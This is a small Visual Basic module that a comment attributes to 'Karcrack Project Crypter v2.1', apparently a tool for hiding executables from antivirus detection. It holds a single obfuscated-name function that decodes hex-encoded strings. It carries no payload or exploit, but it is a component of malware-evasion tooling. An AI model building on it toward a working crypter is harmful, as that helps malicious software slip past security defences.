Attribute VB_Name = "iAdjsaSD§_"
'Funcion parte del Karcrack Project Crypter v2.1
Public Function giupnktse(ByVal sData As String) As String
    Dim i       As Long
    For i = 1 To Len(sData) Step 2
       giupnktse = giupnktse & Chr$(Val("&H" & Mid$(sData, i, 2)))
    Next i
End Function
